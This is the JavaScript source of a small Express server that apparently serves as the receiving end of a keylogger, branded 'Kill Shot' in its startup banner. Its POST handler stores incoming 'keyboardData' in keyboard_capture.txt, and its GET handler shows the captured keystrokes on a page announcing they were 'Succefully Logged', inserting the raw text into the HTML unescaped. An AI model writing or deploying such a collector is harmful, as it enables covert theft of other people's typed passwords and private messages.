// We import the fs module so that we can have access to the file system.
const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");
var figlet = require("figlet");

// Create the express app.
const app = express();

/* app should use bodyParser. For this example we'll use json. bodyParser allows you to
access the body of your request.
*/
app.use(bodyParser.json({extended: true}));

// We assign the port number 8080.
const port = 8080;

// When a GET request is made to the "/" resource we return basic HTML.
app.get("/", (req, res) => {
   
    try {
        const kl_file = fs.readFileSync("./keyboard_capture.txt", {encoding:'utf8', flag:'r'});    
        // We send the txt file data to the server. We replace the "\n" with <br> 
        res.send(`<h1>Succefully Logged 😎</h1><p style="background-color: black;color: rgb(0, 255, 0);width: 90%;font-size: 25px;padding: 10px;margin: 10px; border-radius: 10px;">${kl_file.replace("\n", "<br>")}</p>`);
    } catch {
        res.send("<h1>Nothing logged yet.</h1>");
    }  
});


app.post("/", (req, res) => {
    // For demo purposes we log the keyboardData sent as part of the body of the POST request to the server.
    console.log(req.body.keyboardData);
    // Will now write the keyboard capture to a text file.
    fs.writeFileSync("keyboard_capture.txt", req.body.keyboardData);
    res.send("Successfully set the data");
});
// We can see that the app is listening on which port.
app.listen(port, () => {
    console.log(`App is listening on port ${port}`);
    
figlet("Kill Shot ", {
    font: "epic",
    horizontalLayout: "default",
    verticalLayout: "default",
    width: 100,
    size:0.4,
    whitespaceBreak: true,
  },function (err, data) {
  if (err) {
    console.log("Something went wrong...");
    console.dir(err);
    return;
  }
  console.log(data);
});

});
